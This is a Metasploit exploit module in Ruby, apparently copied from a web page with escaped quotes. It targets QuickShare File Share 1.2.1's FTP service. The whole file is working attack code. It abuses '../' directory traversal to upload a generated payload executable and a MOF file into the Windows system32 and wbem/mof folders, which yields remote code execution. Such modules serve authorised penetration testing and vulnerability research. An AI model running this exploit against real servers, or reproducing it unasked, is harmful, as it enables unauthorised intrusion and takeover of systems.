
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::Ftp
    include Msf::Exploit::Remote::TcpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::WbemExec
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "QuickShare File Share 1.2.1 Directory Traversal Vulnerability",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in QuickShare File Share&#039;s FTP
                service.  By supplying "../" in the file path, it is possible to trigger a
                directory traversal flaw, allowing the attacker to read a file outside the
                virtual directory.  By default, the "Writable" option is enabled during account
                creation, therefore this makes it possible to create a file at an arbitrary
                location, which leads to remote code execution.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;modpr0be&#039;, #Discovery, PoC
                    &#039;sinn3r&#039;    #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;OSVDB&#039;, &#039;70776&#039;],
                    [&#039;EDB&#039;, &#039;16105&#039;],
                    [&#039;URL&#039;, &#039;http://www.quicksharehq.com/blog/quickshare-file-server-1-2-2-released.html&#039;],
                    [&#039;URL&#039;, &#039;http://www.digital-echidna.org/2011/02/quickshare-file-share-1-2-1-directory-traversal-vulnerability/&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00"
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "none"
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [&#039;QuickShare File Share 1.2.1&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Feb 03 2011",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                # Change the default description so this option makes sense
                OptPort.new(&#039;SRVPORT&#039;, [true, &#039;The local port to listen on for active mode&#039;, 8080])
            ], self.class)
    end
 
 
    def check
        connect
        disconnect
 
        if banner =~ /quickshare ftpd/
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
 
    def on_client_connect(cli)
        peer = "#{cli.peerhost}:#{cli.peerport}"
 
        case @stage
        when :exe
            print_status("#{peer} - Sending executable (#{@exe.length.to_s} bytes)")
            cli.put(@exe)
            @stage = :mof
 
        when :mof
            print_status("#{peer} - Sending MOF (#{@mof.length.to_s} bytes)")
            cli.put(@mof)
        end
 
        cli.close
    end
 
 
    def upload(filename)
        select(nil, nil, nil, 1)
 
        peer = "#{rhost}:#{rport}"
        print_status("#{peer} - Trying to upload #{::File.basename(filename)}")
 
        # We can&#039;t use connect_login, because it cannot determine a successful login correctly.
        # For example: The server actually returns a 503 (Bad Sequence of Commands) when the
        # user has already authenticated.
        conn = connect(false, datastore[&#039;VERBOSE&#039;])
 
        res = send_user(datastore[&#039;FTPUSER&#039;], conn)
 
        if res !~ /^(331|2)/
            vprint_error("#{peer} - The server rejected our username: #{res.to_s}")
            return false
        end
 
        res = send_pass(datastore[&#039;FTPPASS&#039;], conn)
        if res !~ /^(2|503)/
            vprint_error("#{peer} - The server rejected our password: #{res.to_s}")
            return false
        end
 
        # Switch to binary mode
        print_status("#{peer} - Set binary mode")
        send_cmd([&#039;TYPE&#039;, &#039;I&#039;], true, conn)
 
        # Prepare active mode: Get attacker&#039;s IP and source port
        src_ip   = datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039; ? Rex::Socket.source_address("50.50.50.50") : datastore[&#039;SRVHOST&#039;]
        src_port = datastore[&#039;SRVPORT&#039;].to_i
 
        # Prepare active mode: Convert the IP and port for active mode
        src_ip   = src_ip.gsub(/\./, &#039;,&#039;)
        src_port = "#{src_port/256},#{src_port.remainder(256)}"
 
        # Set to active mode
        print_status("#{peer} - Set active mode \"#{src_ip},#{src_port}\"")
        send_cmd([&#039;PORT&#039;, "#{src_ip},#{src_port}"], true, conn)
 
        # Tell the FTP server to download our file
        send_cmd([&#039;STOR&#039;, filename], false, conn)
 
        disconnect(conn)
    end
 
 
    def exploit
        trigger  = &#039;../../../../../../../../&#039;
        exe_name = "#{trigger}WINDOWS/system32/#{rand_text_alpha(rand(10)+5)}.exe"
        mof_name = "#{trigger}WINDOWS/system32/wbem/mof/#{rand_text_alpha(rand(10)+5)}.vbs"
        @mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))
        @exe      = generate_payload_exe
        @stage = :exe
 
        begin
            t = framework.threads.spawn("reqs", false) {
                # Upload our malicious executable
                u = upload(exe_name)
 
                # Upload the mof file
                upload(mof_name) if u
            }
            super
        ensure
            t.kill
        end
    end
 
end



